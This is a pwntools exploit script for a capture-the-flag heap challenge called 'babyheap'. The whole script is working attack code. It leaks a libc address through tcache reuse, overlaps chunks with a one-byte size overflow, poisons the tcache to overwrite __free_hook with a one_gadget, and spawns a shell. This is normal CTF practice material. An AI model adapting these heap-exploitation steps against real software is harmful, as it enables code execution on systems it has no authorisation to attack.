#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./babyheap")
libc = ELF("./libc.so.6")
env = {"LD_PRELOAD":"./libc.so.6"}
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
#context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
context.aslr = False

global io
breakpoints = '''
break *0x55555555575f
continue
'''+"continue\n"*39

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path, env=env)
else:
    io = gdb.debug(exe.path, env=env, gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def malloc(size,content):
    sla("> ", "M")
    sla("> ", str(size))
    sla("> ", content)

def free(index):
    sla("> ", "F")
    sla("> ", str(index))

def show(index):
    sla("> ", "S")
    sla("> ", str(index))

def exit():
    sla("> ", "E")

one_gadget = 0xe2383

for i in range(10):
    malloc(0xf8,"A"*4)
    
for i in range(9):
    free(i)

for i in range(9):
    malloc(0xf8,"B"*8)

show(7)
re(8)
libc.address = unpack(re(6),48) - 0x1e4e90
log.info("Libc -> "+hex(libc.address)) 

free(2)
free(1)
free(0)

malloc(0xf8,"Z"*0xf8)
malloc(0xf8,"Y"*0xf8)
malloc(0xf8,"X"*0xf8+"\x81")

free(1)
free(2)
free(0)

malloc(0x178,"D"*0x100+p64(libc.symbols["__free_hook"])[:6])

malloc(0xf8,"/bin/sh")
malloc(0xf8,p64(libc.address+one_gadget)[:6])

free(0)

io.interactive()